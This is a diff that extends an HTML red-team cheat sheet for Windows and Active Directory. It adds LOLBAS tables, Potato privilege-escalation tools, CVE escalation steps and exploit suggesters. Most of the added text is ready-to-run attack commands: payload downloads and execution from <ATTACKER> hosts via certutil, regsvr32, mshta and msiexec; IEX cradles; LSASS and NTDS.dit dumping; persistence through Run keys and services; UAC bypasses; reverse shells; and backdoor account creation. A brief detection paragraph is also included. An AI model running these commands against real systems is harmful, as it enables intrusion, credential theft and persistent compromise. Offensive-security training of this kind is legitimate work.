@@ -336,7 +336,8 @@ mark.hl{background:#4d1a1a;color:#ffb3b3;border-radius:2px;padding:0 2px}
         <div class="li-field"><label>DC Hostname</label><input id="l-dchost" placeholder="DC01" autocomplete="off"></div>
         <div class="li-field"><label>CA / ADCS Server</label><input id="l-ca" placeholder="CA IP or hostname" autocomplete="off"></div>
         <div class="li-field"><label>Exchange Server</label><input id="l-exch" placeholder="Exchange IP" autocomplete="off"></div>
-        <div class="li-field"><label>Other (MSSQL, WSUS…)</label><input id="l-other" placeholder="host:port" autocomplete="off"></div>
+        <div class="li-field"><label>SCCM / WSUS</label><input id="l-sccm" placeholder="SCCM IP / port 8443" autocomplete="off"></div>
+        <div class="li-field"><label>Other (MSSQL, ADIDNS…)</label><input id="l-other" placeholder="host:port" autocomplete="off"></div>
       </div>
       <div id="l-access-wrap">
         <label>Current Access Level</label>
@@ -1187,6 +1188,309 @@ mark.hl{background:#4d1a1a;color:#ffb3b3;border-radius:2px;padding:0 2px}
       </div>
     </div>
 
+    <!-- LOLBAS — Living Off the Land Binaries & Scripts -->
+    <div class="ref-card" id="rc-lolbas">
+      <div class="ref-hdr" onclick="toggleRef('rc-lolbas')">
+        <span class="ref-icon">&#128295;</span>
+        <span class="ref-title">LOLBAS — Living Off the Land Binaries, Scripts &amp; Libraries</span>
+        <span class="ref-chev">&#9660;</span>
+      </div>
+      <div class="ref-body">
+        <p style="font-size:12px;color:var(--text2);margin:8px 0 14px">Built-in Windows binaries that can execute, download, or dump without dropping external tools. Full database: <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer" style="color:var(--blue);text-decoration:none">lolbas-project.github.io</a> — covers every binary with capabilities, commands, and detections.</p>
+
+        <div class="ref-sub">File Download &amp; Staging — deliver payloads using only built-in tools</div>
+        <table class="ref-tbl">
+          <tr><th>Binary</th><th>Have</th><th>Get</th><th>Command</th></tr>
+          <tr>
+            <td><strong>certutil.exe</strong></td>
+            <td>Any shell with outbound HTTP</td>
+            <td>File downloaded to disk</td>
+            <td><code class="ic">certutil -urlcache -split -f http://&lt;ATTACKER&gt;:8080/tool.exe C:\Temp\tool.exe</code></td>
+          </tr>
+          <tr>
+            <td><strong>certutil.exe</strong> (encode/decode)</td>
+            <td>Any shell; file on disk</td>
+            <td>Base64 encode for exfil or paste-delivery; decode on target</td>
+            <td><code class="ic">certutil -encode file.exe file.b64</code> / <code class="ic">certutil -decode file.b64 file.exe</code></td>
+          </tr>
+          <tr>
+            <td><strong>bitsadmin.exe</strong></td>
+            <td>Any shell with outbound HTTP</td>
+            <td>Background file download (survives logoff, proxies)</td>
+            <td><code class="ic">bitsadmin /transfer job /download /priority high http://&lt;ATTACKER&gt;/tool.exe C:\Temp\tool.exe</code></td>
+          </tr>
+          <tr>
+            <td><strong>curl.exe</strong> (Win10 1803+)</td>
+            <td>Any shell with outbound HTTP</td>
+            <td>File downloaded; familiar syntax, no PowerShell needed</td>
+            <td><code class="ic">curl -s -o C:\Temp\tool.exe http://&lt;ATTACKER&gt;:8080/tool.exe</code></td>
+          </tr>
+          <tr>
+            <td><strong>expand.exe</strong></td>
+            <td>CAB file accessible; no network needed</td>
+            <td>Extract files from .cab archive — no external tools required</td>
+            <td><code class="ic">expand file.cab -F:* C:\Temp\</code></td>
+          </tr>
+          <tr>
+            <td><strong>esentutl.exe</strong></td>
+            <td>Source file accessible (incl. VSS/SMB)</td>
+            <td>Byte-perfect raw file copy — works on locked/in-use files</td>
+            <td><code class="ic">esentutl /y \\&lt;ATTACKER&gt;\share\tool.exe /d C:\Temp\tool.exe /o</code></td>
+          </tr>
+        </table>
+
+        <div class="ref-sub">Credential &amp; Hash Dumping — extract secrets using only Windows binaries</div>
+        <table class="ref-tbl">
+          <tr><th>Binary</th><th>Have</th><th>Get</th><th>Command</th></tr>
+          <tr>
+            <td><strong>rundll32.exe + comsvcs.dll</strong> <em>(most used)</em></td>
+            <td>Local admin; LSASS PID (from tasklist)</td>
+            <td>Full LSASS minidump → pypykatz / secretsdump → NT hashes + Kerberos tickets</td>
+            <td><code class="ic">tasklist | findstr lsass</code> → <code class="ic">rundll32 comsvcs.dll MiniDump &lt;PID&gt; C:\Temp\lsass.dmp full</code></td>
+          </tr>
+          <tr>
+            <td><strong>reg.exe</strong> (SAM hive)</td>
+            <td>Local admin</td>
+            <td>SAM + SYSTEM hives → offline NTLM hash cracking (local accounts)</td>
+            <td><code class="ic">reg save HKLM\SAM C:\Temp\SAM.hiv &amp;&amp; reg save HKLM\SYSTEM C:\Temp\SYS.hiv</code> → <code class="ic">secretsdump LOCAL -sam SAM.hiv -system SYS.hiv</code></td>
+          </tr>
+          <tr>
+            <td><strong>reg.exe</strong> (AutoLogon)</td>
+            <td>Any user shell</td>
+            <td>Plaintext AutoLogon password in registry — often a service/admin account</td>
+            <td><code class="ic">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword</code></td>
+          </tr>
+          <tr>
+            <td><strong>vssadmin.exe</strong></td>
+            <td>Local admin</td>
+            <td>Volume shadow copy of C: → copy locked NTDS.dit + SYSTEM hive</td>
+            <td><code class="ic">vssadmin create shadow /for=C:</code> → <code class="ic">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit</code></td>
+          </tr>
+          <tr>
+            <td><strong>diskshadow.exe</strong></td>
+            <td>Local admin (DC preferred)</td>
+            <td>Expose shadow copy as drive letter → copy NTDS.dit without touching it directly</td>
+            <td>Script file: <code class="ic">set context persistent nowriters</code> / <code class="ic">add volume c: alias c</code> / <code class="ic">create</code> / <code class="ic">expose %c% e:</code> → <code class="ic">diskshadow /s script.dsh</code> → <code class="ic">copy e:\Windows\NTDS\ntds.dit C:\Temp\</code></td>
+          </tr>
+          <tr>
+            <td><strong>ntdsutil.exe</strong></td>
+            <td>DA / SYSTEM on DC</td>
+            <td>Full IFM snapshot: NTDS.dit + SYSTEM hive in one shot → all domain hashes offline</td>
+            <td><code class="ic">ntdsutil "ac in ntds" "ifm" "cr fu C:\Temp\ntds" q q</code> → <code class="ic">secretsdump -ntds C:\Temp\ntds\Active Directory\ntds.dit -system C:\Temp\ntds\registry\SYSTEM LOCAL</code></td>
+          </tr>
+          <tr>
+            <td><strong>esentutl.exe</strong> (NTDS copy)</td>
+            <td>Local admin on DC</td>
+            <td>Raw copy of in-use NTDS.dit via VSS — no snapshot needed</td>
+            <td><code class="ic">esentutl /y /vss C:\Windows\NTDS\ntds.dit /d C:\Temp\ntds.dit</code></td>
+          </tr>
+        </table>
+
+        <div class="ref-sub">Proxy Execution &amp; Restriction Bypass — execute code in AppLocker / SRP / constrained environments</div>
+        <table class="ref-tbl">
+          <tr><th>Binary</th><th>Have</th><th>Get</th><th>Command / Notes</th></tr>
+          <tr>
+            <td><strong>regsvr32.exe</strong> (Squiblydoo)</td>
+            <td>Any user; outbound HTTP to attacker</td>
+            <td>Code exec bypassing AppLocker whitelist — loads COM scriptlet over HTTP</td>
+            <td><code class="ic">regsvr32 /s /n /u /i:http://&lt;ATTACKER&gt;/payload.sct scrobj.dll</code></td>
+          </tr>
+          <tr>
+            <td><strong>mshta.exe</strong></td>
+            <td>Any user; outbound HTTP</td>
+            <td>Execute HTA (HTML Application) — VBScript/JScript, bypasses many AV</td>
+            <td><code class="ic">mshta http://&lt;ATTACKER&gt;/payload.hta</code> / <code class="ic">mshta "javascript:a=GetObject('script:http://attacker/payload.sct')"</code></td>
+          </tr>
+          <tr>
+            <td><strong>msiexec.exe</strong></td>
+            <td>Any user (remote MSI); local admin for silent; AlwaysInstallElevated=1 for LPE</td>
+            <td>Execute MSI payload — SYSTEM shell if AlwaysInstallElevated set</td>
+            <td><code class="ic">msiexec /quiet /qn /i http://&lt;ATTACKER&gt;/payload.msi</code> or <code class="ic">msiexec /quiet /qn /i C:\Temp\payload.msi</code></td>
+          </tr>
+          <tr>
+            <td><strong>MSBuild.exe</strong></td>
+            <td>Any user; .csproj file on disk</td>
+            <td>Execute inline C# / Roslyn task — trusted Microsoft binary, bypasses AppLocker</td>
+            <td><code class="ic">MSBuild.exe C:\Temp\payload.csproj</code></td>
+          </tr>
+          <tr>
+            <td><strong>InstallUtil.exe</strong></td>
+            <td>Any user; .NET exe on disk</td>
+            <td>Execute C# Uninstall method — bypasses AppLocker / SRP whitelist</td>
+            <td><code class="ic">InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\payload.exe</code></td>
+          </tr>
+          <tr>
+            <td><strong>cmstp.exe</strong></td>
+            <td>Any user; INF file on disk</td>
+            <td>Execute from INF file — also bypasses UAC on older systems</td>
+            <td><code class="ic">cmstp.exe /ni /s C:\Temp\payload.inf</code></td>
+          </tr>
+          <tr>
+            <td><strong>wscript.exe / cscript.exe</strong></td>
+            <td>Any user; .vbs / .js file on disk</td>
+            <td>Execute VBScript or JScript — wscript is GUI, cscript is console output</td>
+            <td><code class="ic">wscript.exe payload.vbs</code> / <code class="ic">cscript.exe payload.js</code></td>
+          </tr>
+          <tr>
+            <td><strong>rundll32.exe</strong> (DLL exec)</td>
+            <td>Any user; .dll file on disk</td>
+            <td>Execute exported DLL entry point — no installer, blends with normal usage</td>
+            <td><code class="ic">rundll32.exe C:\Temp\payload.dll,EntryPoint</code></td>
+          </tr>
+          <tr>
+            <td><strong>forfiles.exe</strong></td>
+            <td>Any user</td>
+            <td>Indirect command execution — hides the real process in /c parameter</td>
+            <td><code class="ic">forfiles /c "cmd /c C:\Temp\payload.exe"</code></td>
+          </tr>
+        </table>
+
+        <div class="ref-sub">Enumeration — built-in recon with no extra tools</div>
+        <table class="ref-tbl">
+          <tr><th>Binary</th><th>Have</th><th>Get</th><th>Key Commands</th></tr>
+          <tr>
+            <td><strong>net.exe</strong></td>
+            <td>Domain user shell</td>
+            <td>Domain users, groups, DA members, shares, sessions</td>
+            <td><code class="ic">net user /domain</code> / <code class="ic">net group "Domain Admins" /domain</code> / <code class="ic">net group "Enterprise Admins" /domain</code> / <code class="ic">net share</code></td>
+          </tr>
+          <tr>
+            <td><strong>nltest.exe</strong></td>
+            <td>Domain user shell</td>
+            <td>DC list, domain trust mappings, site topology</td>
+            <td><code class="ic">nltest /dclist:&lt;domain&gt;</code> / <code class="ic">nltest /domain_trusts</code> / <code class="ic">nltest /dsgetdc:&lt;domain&gt;</code></td>
+          </tr>
+          <tr>
+            <td><strong>wmic.exe</strong></td>
+            <td>Domain user shell</td>
+            <td>OS version, hotfixes (feed to WES-NG), processes, share info</td>
+            <td><code class="ic">wmic os get caption,version,buildnumber</code> / <code class="ic">wmic qfe list</code> / <code class="ic">wmic computersystem get domain</code></td>
+          </tr>
+          <tr>
+            <td><strong>dsquery.exe</strong> (RSAT)</td>
+            <td>Domain user shell with dsquery installed</td>
+            <td>Direct LDAP queries — users, groups, OUs, computers, SPNs</td>
+            <td><code class="ic">dsquery user -name "*" -limit 0</code> / <code class="ic">dsquery group -name "Domain Admins"</code> / <code class="ic">dsquery * -filter "(servicePrincipalName=*)"</code></td>
+          </tr>
+          <tr>
+            <td><strong>systeminfo.exe</strong></td>
+            <td>Any shell</td>
+            <td>OS build + installed KBs → feed to WES-NG offline for CVE candidates</td>
+            <td><code class="ic">systeminfo &gt; C:\Temp\sysinfo.txt</code> (exfil → python wesng.py sysinfo.txt)</td>
+          </tr>
+          <tr>
+            <td><strong>ipconfig.exe</strong></td>
+            <td>Any shell</td>
+            <td>DNS server (= DC IP), domain name, network adapter details</td>
+            <td><code class="ic">ipconfig /all</code> — DNS Servers field is almost always the DC IP</td>
+          </tr>
+          <tr>
+            <td><strong>klist.exe</strong></td>
+            <td>Domain user shell</td>
+            <td>Current Kerberos tickets in session — shows cached TGTs and TGSs</td>
+            <td><code class="ic">klist</code> / <code class="ic">klist sessions</code> (list all logon sessions)</td>
+          </tr>
+        </table>
+
+        <div class="ref-sub">Remote Execution &amp; Lateral Movement — move laterally with no extra tools</div>
+        <table class="ref-tbl">
+          <tr><th>Binary</th><th>Have</th><th>Get</th><th>Key Commands</th></tr>
+          <tr>
+            <td><strong>wmic.exe</strong> (remote)</td>
+            <td>Local admin on remote target</td>
+            <td>Remote process creation — no WinRM/RDP port needed, port 135 sufficient</td>
+            <td><code class="ic">wmic /node:&lt;TARGET&gt; /user:&lt;DOMAIN&gt;\&lt;USER&gt; /password:&lt;PASS&gt; process call create "cmd /c payload.exe"</code></td>
+          </tr>
+          <tr>
+            <td><strong>schtasks.exe</strong> (remote)</td>
+            <td>Local admin on remote target</td>
+            <td>Remote scheduled task — runs as SYSTEM or any user, flexible timing</td>
+            <td><code class="ic">schtasks /create /s &lt;TARGET&gt; /tn Job1 /tr C:\Temp\payload.exe /sc once /st 00:00 /ru SYSTEM /u &lt;USER&gt; /p &lt;PASS&gt;</code> → <code class="ic">schtasks /run /s &lt;TARGET&gt; /tn Job1</code></td>
+          </tr>
+          <tr>
+            <td><strong>sc.exe</strong> (remote)</td>
+            <td>Local admin on remote target</td>
+            <td>Remote service creation → code exec as SYSTEM; also used to abuse weak service perms</td>
+            <td><code class="ic">sc \\&lt;TARGET&gt; create svc1 binpath= "C:\Temp\payload.exe" &amp;&amp; sc \\&lt;TARGET&gt; start svc1</code></td>
+          </tr>
+          <tr>
+            <td><strong>net use + UNC exec</strong></td>
+            <td>Local admin or valid creds on remote</td>
+            <td>Access remote shares, execute files directly over UNC without copying to disk</td>
+            <td><code class="ic">net use \\&lt;TARGET&gt;\C$ /user:&lt;DOMAIN&gt;\&lt;USER&gt; &lt;PASS&gt;</code> → <code class="ic">\\&lt;TARGET&gt;\C$\Temp\payload.exe</code></td>
+          </tr>
+        </table>
+
+        <div class="ref-sub">Persistence — built-in methods that survive reboots</div>
+        <table class="ref-tbl">
+          <tr><th>Binary / Method</th><th>Have</th><th>Get</th><th>Command</th></tr>
+          <tr>
+            <td><strong>schtasks.exe</strong></td>
+            <td>Local admin (SYSTEM tasks) or any user (HKCU tasks)</td>
+            <td>Scheduled task persistence — runs on logon, startup, or interval</td>
+            <td><code class="ic">schtasks /create /tn Updater /tr "C:\Temp\payload.exe" /sc onlogon /ru SYSTEM</code></td>
+          </tr>
+          <tr>
+            <td><strong>reg.exe</strong> (Run keys)</td>
+            <td>Any user (HKCU) / admin (HKLM)</td>
+            <td>Registry Run key persistence — executes payload on every logon</td>
+            <td><code class="ic">reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Temp\payload.exe" /f</code></td>
+          </tr>
+          <tr>
+            <td><strong>sc.exe</strong></td>
+            <td>Local admin</td>
+            <td>Persistent Windows service — starts automatically with OS</td>
+            <td><code class="ic">sc create MySvc binpath= "C:\Temp\payload.exe" start= auto &amp;&amp; sc start MySvc</code></td>
+          </tr>
+        </table>
+
+        <div class="ref-sub">UAC Bypass — elevate from admin (medium integrity) to high integrity without prompt</div>
+        <table class="ref-tbl">
+          <tr><th>Binary</th><th>Have</th><th>Get</th><th>Method</th></tr>
+          <tr>
+            <td><strong>fodhelper.exe</strong></td>
+            <td>Admin account (medium integrity)</td>
+            <td>Elevated cmd/payload without UAC prompt — abuses ms-settings handler</td>
+            <td><code class="ic">reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe" /f</code> + <code class="ic">reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f</code> → <code class="ic">fodhelper.exe</code></td>
+          </tr>
+          <tr>
+            <td><strong>eventvwr.exe</strong></td>
+            <td>Admin account (medium integrity)</td>
+            <td>Elevated shell via Event Viewer DLL hijack / registry hijack</td>
+            <td><code class="ic">reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f &amp;&amp; eventvwr.exe</code></td>
+          </tr>
+          <tr>
+            <td><strong>msiexec.exe + AlwaysInstallElevated</strong></td>
+            <td>Any user; HKCU+HKLM AlwaysInstallElevated=1</td>
+            <td>SYSTEM shell via crafted MSI without admin rights</td>
+            <td>Check: <code class="ic">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code> → if 0x1: <code class="ic">msfvenom -p windows/x64/exec CMD="net user ..." -f msi -o esc.msi &amp;&amp; msiexec /quiet /qn /i esc.msi</code></td>
+          </tr>
+        </table>
+
+        <div class="ref-sub">Privilege Escalation via Service Abuse</div>
+        <table class="ref-tbl">
+          <tr><th>Binary</th><th>Have</th><th>Get</th><th>Command</th></tr>
+          <tr>
+            <td><strong>sc.exe</strong> (weak service perms)</td>
+            <td>Writable service binary path or SERVICE_CHANGE_CONFIG right</td>
+            <td>SYSTEM shell via service binary replacement or binpath change</td>
+            <td><code class="ic">sc qc &lt;SVC&gt;</code> → check binpath / verify writable → <code class="ic">sc config &lt;SVC&gt; binpath= "net user backdoor P@ss123! /add"</code> → <code class="ic">sc stop &lt;SVC&gt; &amp;&amp; sc start &lt;SVC&gt;</code></td>
+          </tr>
+          <tr>
+            <td><strong>icacls.exe</strong></td>
+            <td>Any user shell</td>
+            <td>Check file/dir permissions — find world-writable service binaries or sensitive dirs</td>
+            <td><code class="ic">icacls "C:\Program Files\VulnService\service.exe"</code> / <code class="ic">icacls C:\Windows\System32\config\SAM</code> (HiveNightmare check)</td>
+          </tr>
+        </table>
+
+        <div class="detect">
+          <strong>Detection:</strong>
+          Ev 4688 / Sysmon Ev 1 — process creation with <code>certutil.exe</code> containing <code>-urlcache</code> or URL arguments. Ev 4688 — <code>rundll32.exe</code> spawning with <code>comsvcs.dll</code> argument. Ev 4688 — <code>regsvr32.exe</code> with <code>/u /i:http</code> arguments (Squiblydoo). Ev 4688 — <code>mshta.exe</code> with HTTP argument. Ev 7045 / 4697 — unexpected service installations (sc.exe lateral). Ev 4698 / 4702 — scheduled task creation (schtasks persistence). Ev 8222 (Sysmon) / VSS provider logs — shadow copy creation for NTDS extraction. ETW Microsoft-Windows-Security-Auditing — LSASS access events 4656/4663 on lsass.exe. MDATP / Defender for Endpoint: built-in rules for LSASS dump via comsvcs.dll, certutil download, regsvr32 squiblydoo.
+        </div>
+      </div>
+    </div>
+
     <!-- 7. Local Privilege Escalation (User → Local Admin / SYSTEM) -->
     <div class="ref-card" id="rc-lpe">
       <div class="ref-hdr" onclick="toggleRef('rc-lpe')">
@@ -1247,13 +1551,32 @@ mark.hl{background:#4d1a1a;color:#ffb3b3;border-radius:2px;padding:0 2px}
           </tr>
         </table>
 
-        <div class="ref-sub">Potato Attacks — SeImpersonate → SYSTEM</div>
+        <div class="ref-sub">Potato Attacks — SeImpersonate / SeAssignPrimaryToken → SYSTEM</div>
         <table class="ref-tbl">
-          <tr><th>Tool</th><th>Command</th><th>Works on</th></tr>
-          <tr><td>GodPotato <em>(recommended)</em></td><td><code class="ic">.\GodPotato.exe -cmd "net user admin P@ss123! /add && net localgroup Administrators admin /add"</code></td><td>Windows Server 2012–2022, Win 10/11</td></tr>
-          <tr><td>PrintSpoofer</td><td><code class="ic">.\PrintSpoofer.exe -i -c cmd.exe</code></td><td>Server 2016/2019/2022, Win 10 — requires Print Spooler</td></tr>
-          <tr><td>JuicyPotatoNG</td><td><code class="ic">.\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"</code></td><td>Server 2019+, Win 10 1809+</td></tr>
-          <tr><td>SweetPotato</td><td><code class="ic">.\SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c whoami"</code></td><td>Broad coverage, uses EFSR coercion</td></tr>
+          <tr><th>Tool</th><th>Requires</th><th>Command</th><th>OS Coverage</th></tr>
+          <tr><td><strong>GodPotato</strong> <em>(best default)</em></td><td>SeImpersonate or SeAssignPrimaryToken</td><td><code class="ic">.\GodPotato.exe -cmd "cmd /c whoami"</code><br><code class="ic">.\GodPotato-NET4.exe -cmd "..."</code></td><td>Server 2012–2022, Win 8–11</td></tr>
+          <tr><td><strong>SigmaPotato</strong> <em>(universal)</em></td><td>SeImpersonate or SeAssignPrimaryToken</td><td><code class="ic">.\SigmaPotato.exe "cmd /c whoami"</code></td><td>Server 2016–2022, Win 10/11</td></tr>
+          <tr><td><strong>PrintSpoofer</strong></td><td>SeImpersonate + Print Spooler service running</td><td><code class="ic">.\PrintSpoofer.exe -i -c cmd.exe</code></td><td>Server 2016/2019/2022, Win 10</td></tr>
+          <tr><td><strong>SweetPotato</strong></td><td>SeImpersonate</td><td><code class="ic">.\SweetPotato.exe -e EfsRpc -p cmd.exe</code><br><code class="ic">.\SweetPotato.exe -e PrintSpoofer -p cmd.exe</code></td><td>Broad — multiple techniques (<code class="ic">-e EfsRpc|PrintSpoofer|WinRM</code>)</td></tr>
+          <tr><td><strong>JuicyPotatoNG</strong></td><td>SeImpersonate or SeAssignPrimaryToken</td><td><code class="ic">.\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"</code></td><td>Server 2019+, Win 10 1809+</td></tr>
+          <tr><td><strong>RoguePotato</strong></td><td>SeImpersonate + socat/port forward on attacker (port 135)</td><td>Attacker: <code class="ic">socat tcp-listen:135,reuseaddr,fork tcp:&lt;target&gt;:9999</code><br>Target: <code class="ic">.\RoguePotato.exe -r &lt;attacker-IP&gt; -e "cmd.exe" -l 9999</code></td><td>Server 2019, Win 10 1809+</td></tr>
+          <tr><td><strong>SharpEfsPotato</strong></td><td>SeImpersonate (uses EFSR coercion)</td><td><code class="ic">.\SharpEfsPotato.exe -p cmd.exe -a "/c whoami"</code></td><td>Server 2016/2019, Win 10</td></tr>
+          <tr><td><strong>JuicyPotato</strong> <em>(original)</em></td><td>SeImpersonate or SeAssignPrimaryToken + working COM CLSID</td><td><code class="ic">.\JuicyPotato.exe -l 1337 -p cmd.exe -t * [-c {CLSID}]</code><br>Auto-find CLSID: <strong>LovelyPotato</strong> wraps this automatically</td><td>Server 2008–2016, Win 7 – Win 10 &lt;1803 only</td></tr>
+          <tr><td><strong>LocalPotato</strong></td><td>Any low-priv user (abuses NTLM local auth — no SeImpersonate needed)</td><td><code class="ic">.\LocalPotato.exe -i payload.dll -o "C:\Windows\System32\target.dll"</code><br>Combine with DLL hijacking for code execution</td><td>Win 10/11, Server 2019/2022</td></tr>
+          <tr><td><strong>CoercedPotato</strong></td><td>SeImpersonate (combines multiple coercion techniques)</td><td><code class="ic">.\CoercedPotato.exe --cmd "cmd /c whoami"</code><br><code class="ic">.\CoercedPotato.exe --revshell &lt;attacker-IP&gt; &lt;port&gt;</code></td><td>Win 10+, Server 2016+</td></tr>
+        </table>
+        <div class="ref-sub">OS Version → Recommended Potato</div>
+        <table class="ref-tbl">
+          <tr><th>OS</th><th>Best Choice</th><th>Fallback</th></tr>
+          <tr><td>Server 2008 / Win 7</td><td>JuicyPotato (original) + LovelyPotato for auto CLSID</td><td>—</td></tr>
+          <tr><td>Server 2012–2016 / Win 10 &lt;1803</td><td>GodPotato</td><td>JuicyPotato, SigmaPotato</td></tr>
+          <tr><td>Server 2019 / Win 10 1809+</td><td>GodPotato, SigmaPotato</td><td>JuicyPotatoNG, RoguePotato, PrintSpoofer</td></tr>
+          <tr><td>Server 2022 / Win 11</td><td>GodPotato, SigmaPotato</td><td>SweetPotato (EfsRpc), CoercedPotato</td></tr>
+        </table>
+        <div class="ref-sub">FullPowers — Restore Stripped SeImpersonate on Service Accounts</div>
+        <table class="ref-tbl">
+          <tr><th>Scenario</th><th>What you need</th><th>What you get</th><th>Command</th></tr>
+          <tr><td>Service account shell has SeImpersonate missing (stripped by OS in some IIS / WCF contexts)</td><td>Shell as the service account; the account <em>should</em> have SeImpersonate but it wasn't assigned to the current process</td><td>New process with full token privileges restored → can now run Potato attacks</td><td><code class="ic">.\FullPowers.exe</code> — creates a scheduled task as self, returns a shell with all default service account privileges<br><code class="ic">.\FullPowers.exe -c ".\GodPotato.exe -cmd '...'"</code> — chain directly into a potato</td></tr>
         </table>
 
         <div class="ref-sub">Service Misconfigurations (PowerUp findings)</div>
@@ -1296,6 +1619,199 @@ mark.hl{background:#4d1a1a;color:#ffb3b3;border-radius:2px;padding:0 2px}
           <tr><td>UACME (tool)</td><td><code class="ic">.\Akagi64.exe &lt;method-number&gt; cmd.exe</code></td><td>Supports 60+ bypass methods — check GitHub for latest working method for target OS build.</td></tr>
         </table>
 
+        <div class="ref-sub">CVE Local Escalations</div>
+        <table class="ref-tbl">
+          <tr><th>CVE</th><th>What you need</th><th>What you get</th><th>Notes &amp; Commands</th></tr>
+          <tr>
+            <td><strong>CVE-2020-0796</strong><br><small>SMBGhost</small></td>
+            <td>Network access to target on SMB port 445; target must be <strong>Win 10 1903 / 1909 only</strong> (unpatched)</td>
+            <td>Unauthenticated pre-auth remote code execution as SYSTEM (local LPE variant also exists)</td>
+            <td>SMBv3 compression header integer overflow. Verify: <code class="ic">nmap -p 445 --script smb2-security-mode &lt;IP&gt;</code>. PoC: <code class="ic">python3 exploit.py &lt;target-IP&gt;</code>. CVE only affects 1903/1909 — patch KB4551762 fixes it. Verify build: <code class="ic">winver</code> must show 18362 or 18363.</td>
+          </tr>
+          <tr>
+            <td><strong>CVE-2021-36934</strong><br><small>HiveNightmare / SeriousSAM</small></td>
+            <td>Any local user account on target (no admin needed); target must be unpatched Windows 10 / 11 with Shadow Copies present</td>
+            <td>Read SAM, SYSTEM, SECURITY registry hives from VSS shadow copy → extract all local account NTLM hashes offline</td>
+            <td>Check: <code class="ic">icacls C:\Windows\System32\config\SAM</code> — if BUILTIN\Users has RX it is vulnerable.<br>List shadow copies: <code class="ic">vssadmin list shadows</code><br>Copy hives: <code class="ic">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .\sam</code><br><code class="ic">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .\system</code><br><code class="ic">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY .\security</code><br>Extract hashes: <code class="ic">secretsdump.py -sam sam -system system -security security LOCAL</code></td>
+          </tr>
+        </table>
+
+        <div class="ref-sub">Additional LPE Enumeration Tools</div>
+        <table class="ref-tbl">
+          <tr><th>Tool</th><th>What you need</th><th>What you get</th><th>Command</th></tr>
+          <tr><td><strong>winPEAS</strong></td><td>Shell on target (any privilege)</td><td>Comprehensive automated scan — creds, services, tokens, registry, paths</td><td><code class="ic">.\winPEASx64.exe</code> or <code class="ic">.\winPEASany.exe</code></td></tr>
+          <tr><td><strong>PowerUp</strong></td><td>PowerShell execution on target</td><td>Service misconfigs, unquoted paths, writable binaries, AlwaysInstallElevated</td><td><code class="ic">. .\PowerUp.ps1; Invoke-AllChecks</code></td></tr>
+          <tr><td><strong>PrivescCheck</strong></td><td>PowerShell execution (AMSI-bypass-friendly, no import required)</td><td>Modern PowerUp alternative — token privs, scheduled tasks, named pipes, COM hijacking, more</td><td><code class="ic">. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report report -Format HTML</code></td></tr>
+          <tr><td><strong>BeRoot</strong></td><td>Shell on target; Python or pre-compiled .exe</td><td>General misconfiguration scan — services, registry, DLL hijacking, task scheduler, path injection</td><td><code class="ic">.\beRoot.exe</code> or <code class="ic">python beRoot.py</code></td></tr>
+          <tr><td><strong>Seatbelt</strong></td><td>Shell on target (any privilege)</td><td>System config, credential files, browser data, network shares, scheduled tasks, AV products</td><td><code class="ic">.\Seatbelt.exe -group=all</code> / <code class="ic">.\Seatbelt.exe CredEnum</code></td></tr>
+        </table>
+
+        <div class="ref-sub">Exploit Identification — Find Unpatched Kernel &amp; LPE CVEs</div>
+        <table class="ref-tbl">
+          <tr><th>Tool</th><th>What you need</th><th>What you get</th><th>Command</th></tr>
+          <tr>
+            <td><strong>WES-NG</strong><br><small style="color:var(--text2)">Windows Exploit Suggester NG<br>(attacker-side, safest)</small></td>
+            <td><code class="ic">systeminfo</code> output from target; Python 3 + <code class="ic">pip install wesng</code> on attacker</td>
+            <td>Cross-references installed hotfixes vs. CVE database — lists every missing patch that has a known exploit, filtered by severity and exploit type</td>
+            <td>
+              Target: <code class="ic">systeminfo &gt; C:\Temp\si.txt</code> → transfer to attacker<br>
+              Attacker: <code class="ic">python3 wes.py --update</code> (update DB first)<br>
+              <code class="ic">python3 wes.py si.txt --exploits-only</code><br>
+              <code class="ic">python3 wes.py si.txt --impact "Elevation of Privilege" -o results.csv</code>
+            </td>
+          </tr>
+          <tr>
+            <td><strong>Watson</strong><br><small style="color:var(--text2)">.NET exploit suggester<br>(runs on target)</small></td>
+            <td>Code execution on target; .NET Framework 4.0+; ideal for modern Windows (Server 2016–2022, Win10/11)</td>
+            <td>Checks OS build + installed patches against a curated list of LPE CVEs with PoC links — runs in-process (execute-assembly friendly)</td>
+            <td>
+              <code class="ic">.\Watson.exe</code><br>
+              Via C2: <code class="ic">execute-assembly /tools/Watson.exe</code><br>
+              PowerShell cradle: <code class="ic">[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://&lt;IP&gt;/Watson.exe'))</code>
+            </td>
+          </tr>
+          <tr>
+            <td><strong>Sherlock</strong><br><small style="color:var(--text2)">PowerShell (legacy)<br>Win 7/2008R2 – early Win10</small></td>
+            <td>PowerShell execution; best for older OS where Watson's CVE list is thin</td>
+            <td>Identifies missing patches for specific known LPE CVEs (MS16-032, MS16-135, etc.)</td>
+            <td>
+              <code class="ic">IEX(New-Object Net.WebClient).DownloadString('http://&lt;IP&gt;/Sherlock.ps1')</code><br>
+              <code class="ic">Find-AllVulns</code>
+            </td>
+          </tr>
+          <tr>
+            <td><strong>winPEAS</strong><br><small style="color:var(--text2)">(covers suggesters + misconfigs)</small></td>
+            <td>Any shell on target</td>
+            <td>Combines exploit suggestions + service misconfigs + credential hunting in one run</td>
